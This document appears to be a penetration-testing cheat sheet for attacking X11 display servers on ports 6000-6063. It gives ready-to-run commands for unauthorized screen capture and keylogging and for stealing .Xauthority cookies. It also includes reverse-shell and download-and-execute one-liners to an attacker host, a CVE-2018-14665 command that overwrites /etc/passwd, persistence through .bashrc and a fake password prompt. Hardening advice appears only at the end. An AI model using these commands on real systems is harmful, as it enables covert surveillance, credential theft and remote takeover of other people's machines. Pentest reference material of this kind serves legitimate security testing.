# X11 ENUMERATION (Port 6000-6063)

## SERVICE OVERVIEW
```
X11 (X Window System) is a display protocol for Unix/Linux GUI
- Default ports: 6000-6063 (6000 + display number)
- Display :0 = Port 6000, :1 = Port 6001, etc.
- Allows remote GUI applications
- Often misconfigured to allow remote connections
- No encryption by default
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p6000-6063 <IP>                        # Scan X11 port range
nmap -sV -p6000 <IP>                             # Scan display :0
nc -nv <IP> 6000                                 # Manual connection
```

## X11 DETECTION
```bash
# Detect X11 service
nmap -p6000 --script x11-access <IP>             # Check X11 access
nmap -p6000-6063 --script x11-access <IP>        # Scan multiple displays

# Check if X11 allows connections
xdpyinfo -display <IP>:0                         # Display info
xwininfo -display <IP>:0 -root                   # Window info

# Test connection
DISPLAY=<IP>:0 xdpyinfo                          # Should return display info if accessible
```

## XHOST ACCESS CONTROL
```bash
# X11 uses xhost for access control
# If misconfigured, anyone can connect!

# Check xhost settings (requires X11 access)
DISPLAY=<IP>:0 xhost                             # List allowed hosts

# Common misconfigurations:
# xhost +                 # Allows EVERYONE!
# xhost +<IP>             # Allows specific IP
# xhost +SI:localuser:*   # Allows local users
```

## UNAUTHORIZED X11 ACCESS
```bash
# If X11 is open (xhost +)
export DISPLAY=<IP>:0

# Take screenshot
DISPLAY=<IP>:0 xwd -root -out screenshot.xwd
convert screenshot.xwd screenshot.png            # Convert to PNG

# View windows
DISPLAY=<IP>:0 xwininfo -root -tree             # List all windows
DISPLAY=<IP>:0 xwininfo -root -children          # Window hierarchy

# Open application on target's screen
DISPLAY=<IP>:0 xterm &                           # Open terminal on victim's screen
DISPLAY=<IP>:0 firefox http://malicious.com &    # Open Firefox
DISPLAY=<IP>:0 xcalc &                           # Open calculator
```

## KEYLOGGING VIA X11
```bash
# If X11 is accessible, you can log keystrokes!

# Using xev
DISPLAY=<IP>:0 xev -root                         # Monitor all keyboard events

# Using xinput
DISPLAY=<IP>:0 xinput list                       # List input devices
DISPLAY=<IP>:0 xinput test <device_id>           # Monitor specific device

# Using xspy
DISPLAY=<IP>:0 xspy                              # Spy on keyboard input

# Automated keylogger
git clone https://github.com/gianlucaborello/libkeylogger
DISPLAY=<IP>:0 ./keylogger
```

## SCREENSHOT CAPTURE
```bash
# Capture screenshots
DISPLAY=<IP>:0 xwd -root -out screenshot.xwd
DISPLAY=<IP>:0 import -window root screenshot.png

# Continuous screenshots (surveillance)
while true; do
    DISPLAY=<IP>:0 xwd -root -out screenshot_$(date +%s).xwd
    sleep 10
done

# Convert XWD to PNG
for f in *.xwd; do convert $f $f.png; done
```

## BACKDOOR VIA X11
```bash
# Open reverse shell via terminal
DISPLAY=<IP>:0 xterm -e "bash -c 'bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1'" &

# Download and execute payload
DISPLAY=<IP>:0 xterm -e "wget http://<attacker_IP>/shell.sh -O /tmp/s.sh && bash /tmp/s.sh" &

# Open malicious GUI application
DISPLAY=<IP>:0 xterm -e "/path/to/backdoor" &
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/x11/open_x11              # Scan for open X11
set RHOSTS <IP>
set RPORT 6000
run

# X11 keylogging
use post/multi/gather/x11_keyboard_event        # Keylogger (if session exists)
```

## X11 FORWARDING VIA SSH
```bash
# Legitimate X11 forwarding via SSH
ssh -X user@<IP>                                 # Enable X11 forwarding
ssh -Y user@<IP>                                 # Trusted X11 forwarding

# After SSH with X11 forwarding:
echo $DISPLAY                                    # Should show localhost:10.0 or similar
xclock &                                         # Test X11 forwarding
firefox &                                        # Open Firefox on remote, display local
```

## X11 VULNERABILITIES
```bash
# Search for X11 exploits
searchsploit x11
searchsploit "x window"
searchsploit xorg

# Common X11 vulnerabilities:
# CVE-2018-14665: Xorg privilege escalation
# CVE-2017-2624: X server privilege escalation
# CVE-2014-8091-8099: Multiple Xorg vulnerabilities
# No authentication by default = design flaw!
```

## PRIVILEGE ESCALATION VIA X11
```bash
# If X11 runs as root and is accessible:

# Method 1: Xorg CVE-2018-14665
Xorg -fp "root::16431:0:99999:7:::" -logfile /etc/passwd :1
# Overwrites /etc/passwd with no password for root!

# Then login:
su root                                          # No password required!

# Method 2: Keylogging root session
# If root is logged into X11:
DISPLAY=:0 xev -root                             # Log root's keystrokes
# Wait for root to type password
```

## NMAP X11 SCRIPTS
```bash
# X11 access check
nmap -p6000 --script x11-access <IP>
nmap -p6000-6063 --script x11-access <IP>        # Multiple displays

# Custom X11 enumeration
nmap -p6000 --script x11-access --script-args timeout=5s <IP>
```

## XAUTHORITY COOKIE STEALING
```bash
# X11 uses .Xauthority for authentication
# If you can read .Xauthority, you can access X11!

# Location of .Xauthority
~/.Xauthority
/home/user/.Xauthority

# Copy .Xauthority from target
scp user@<IP>:~/.Xauthority /tmp/stolen_Xauth

# Use stolen cookie
export XAUTHORITY=/tmp/stolen_Xauth
export DISPLAY=<IP>:0
xdpyinfo                                         # Should work now!

# Read .Xauthority
xauth list                                       # List cookies
xauth -f /tmp/stolen_Xauth list                  # Read from file
```

## DISPLAY MANAGER DETECTION
```bash
# Common X11 display managers:
# - gdm (GNOME Display Manager)
# - kdm (KDE Display Manager)
# - lightdm
# - xdm
# - sddm

# Detect display manager
ps aux | grep -E "gdm|kdm|lightdm|xdm|sddm"
systemctl status gdm
systemctl status lightdm
```

## COMMON MISCONFIGURATIONS
```
☐ xhost + (allows everyone!)                    # Critical misconfiguration
☐ X11 listening on 0.0.0.0                      # Should be localhost only
☐ No authentication required                     # Design flaw in X11
☐ Running as root                                # Privilege escalation
☐ .Xauthority world-readable                    # Cookie theft
☐ Firewall allows port 6000                     # Should be blocked
☐ X11 forwarding enabled by default              # SSH config issue
☐ Old vulnerable Xorg version                    # Known exploits
```

## QUICK WIN CHECKLIST
```
☐ Check if port 6000 is open
☐ Test X11 access (xdpyinfo)
☐ Check xhost configuration
☐ Attempt screenshot capture
☐ Try keylogging
☐ Look for .Xauthority file
☐ Test X11 forwarding via SSH
☐ Check Xorg version for exploits
☐ Test for CVE-2018-14665 (if root)
☐ Monitor for active X11 sessions
```

## ONE-LINER FULL ENUMERATION
```bash
# Comprehensive X11 scan
nmap -sV -p6000-6063 --script "x11-*" -oA x11_enum <IP>

# Quick access test
DISPLAY=<IP>:0 xdpyinfo 2>&1 | head -n 5

# Screenshot test
DISPLAY=<IP>:0 xwd -root -out /tmp/test.xwd && echo "[+] Screenshot captured!"
```

## POST-EXPLOITATION (After X11 Access)
```bash
# 1. Take screenshots for reconnaissance
DISPLAY=<IP>:0 xwd -root -out recon.xwd

# 2. Start keylogger
DISPLAY=<IP>:0 xev -root > keylog.txt &

# 3. Open backdoor terminal
DISPLAY=<IP>:0 xterm -e "bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1" &

# 4. Exfiltrate data via GUI
DISPLAY=<IP>:0 firefox http://<attacker_IP>/upload &

# 5. Install persistence
DISPLAY=<IP>:0 xterm -e "echo 'backdoor_command' >> ~/.bashrc" &

# 6. Social engineering
DISPLAY=<IP>:0 xmessage "System update required. Please enter your password:" &
```

## SECURE X11 CONFIGURATION
```bash
# Disable X11 network listening
# Edit /etc/X11/xinit/xserverrc or display manager config
# Add: -nolisten tcp

# Check if X11 listening on network
netstat -tulpn | grep :6000
ss -tulpn | grep :6000

# Should only show:
# 127.0.0.1:6000 (localhost only, good!)
# 0.0.0.0:6000 (all interfaces, BAD!)

# Disable X11 forwarding in SSH
# Edit /etc/ssh/sshd_config:
X11Forwarding no

# Use xhost carefully
xhost -                                          # Deny all
xhost +localhost                                 # Allow localhost only
xhost +SI:localuser:username                     # Allow specific user
```

## SECURITY IMPLICATIONS
```
CRITICAL RISKS:
1. No authentication by default
2. Keylogging possible
3. Screenshot capture
4. Remote command execution via GUI apps
5. Privilege escalation (Xorg vulns)
6. Social engineering via displayed messages
7. Complete UI control
8. Cookie theft (.Xauthority)
9. Plain text protocol (no encryption)

RECOMMENDATION:
- Never allow X11 on network (use -nolisten tcp)
- Use SSH X11 forwarding instead
- Disable xhost + immediately
- Protect .Xauthority files
- Update Xorg regularly
- Use Wayland instead of X11 (modern alternative)
- Firewall block ports 6000-6063
- Monitor X11 connections
```

## X11 VS WAYLAND
```
X11:
- Old protocol (1984)
- Network transparent (good and bad)
- No authentication by default
- Security issues
- Ports 6000+

Wayland:
- Modern replacement
- No network transparency by default
- Better security model
- Isolated applications
- No default open ports
- Gradually replacing X11
```
